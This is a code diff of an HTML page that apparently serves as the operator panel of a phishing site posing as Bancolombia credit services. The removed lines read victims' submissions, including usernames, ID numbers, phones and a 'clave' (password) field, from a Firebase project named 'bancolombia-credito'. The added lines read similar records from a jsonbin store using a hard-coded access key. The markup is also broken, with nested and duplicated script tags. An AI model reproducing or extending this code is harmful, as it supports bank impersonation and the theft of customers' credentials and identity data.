@@ -1,52 +1,53 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
-<script>
-const firebaseConfig = {
-  apiKey: "AIzaSy5yDnpt57vNCirFZnVklze_irVBT9hmiqbY",
-  authDomain: "bancolombia-credito.firebaseapp.com",
-  projectId: "bancolombia-credito",
-  storageBucket: "bancolombia-credito.appspot.com",
-  messagingSenderId: "354851030251",
-  appId: "1:354851030251:web:e98a68eb7d81a79d942aae"
-};
-firebase.initializeApp(firebaseConfig);
-const db = firebase.firestore();
+ 
+
 </script>
   <script>
-async function cargarSolicitudes(){
-  const contenedor = document.createElement('div');
-  contenedor.style.padding = '20px';
-  contenedor.innerHTML = '<h2>Solicitudes Recibidas</h2>';
+<script>
+const BIN_URL = "https://api.jsonbin.io/v3/b/6as5ff64ac6210805d61ba35";
+const API_KEY = "$2a$10$SHXdeZxqinTPr2kNtYaFBK.jdRq4Ckg/OrCLlo91nNeikzUSYFuiKdK";
+
+async function cargarSolicitudes() {
+  const contenedor = document.createElement("div");
+  contenedor.style.padding = "20px";
   
-  const querySnapshot = await db.collection('solicitudes').orderBy('fecha', 'desc').get();
-  
-  if(querySnapshot.empty){
-    contenedor.innerHTML += '<p>No hay solicitudes registradas todavía.</p>';
-  } else {
-    querySnapshot.forEach(doc => {
-      const s = doc.data();
-      contenedor.innerHTML += `
-        <div style="border:1px solid #ccc; padding:15px; margin:10px 0; border-radius:4px;">
-          <p><strong>Usuario:</strong> ${s.usuario || 'No especificado'}</p>
-          <p><strong>Nombre:</strong> ${s.nombre || 'No especificado'}</p>
-          <p><strong>Documento:</strong> ${s.documento || 'No especificado'}</p>
-          <p><strong>Teléfono:</strong> ${s.telefono || 'No especificado'}</p>
-          <p><strong>Valor a pagar:</strong> ${s.valor || 'No especificado'}</p>
-          <p><strong>Clave:</strong> ${s.clave || 'No especificada'}</p>
-          <p><strong>Fecha:</strong> ${s.fecha || 'Sin fecha'}</p>
-          <p><strong>Estado:</strong> ${s.estado || 'EN PROGRESO'}</p>
-        </div>
-      `;
+  try {
+    const respuesta = await fetch(BIN_URL, {
+      headers: { "X-Access-Key": API_KEY }
     });
+    const datos = await respuesta.json();
+    const solicitudes = datos.record.solicitudes || [];
+    
+    if (solicitudes.length === 0) {
+      contenedor.innerHTML = "<p>No hay solicitudes registradas todavia.</p>";
+    } else {
+      contenedor.innerHTML = "<h2>Solicitudes Recibidas (" + solicitudes.length + ")</h2>";
+      
+      solicitudes.forEach(function(sol) {
+        const tarjeta = document.createElement("div");
+        tarjeta.style = "border:1px solid #ccc; padding:15px; margin:10px 0; border-radius:4px;";
+        tarjeta.innerHTML = 
+          "<strong>Documento:</strong> " + (sol.documento || "-") + "<br>" +
+          "<strong>Tipo:</strong> " + (sol.tipo || "-") + "<br>" +
+          "<strong>Cupo:</strong> " + (sol.cupo || "-") + "<br>" +
+          "<strong>Contacto:</strong> " + (sol.contacto || "-") + "<br>" +
+          "<strong>Fecha:</strong> " + (sol.fecha || "Sin fecha") + "<br>" +
+          "<strong>Estado:</strong> " + (sol.estado || "EN PROGRESO");
+        contenedor.appendChild(tarjeta);
+      });
+    }
+  } catch (error) {
+    contenedor.innerHTML = "<p>Error al cargar: " + error.message + "</p>";
+    console.error(error);
   }
   
   document.body.appendChild(contenedor);
 }
 
-document.addEventListener('DOMContentLoaded', cargarSolicitudes);
+document.addEventListener("DOMContentLoaded", cargarSolicitudes);
+</script>
 </script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
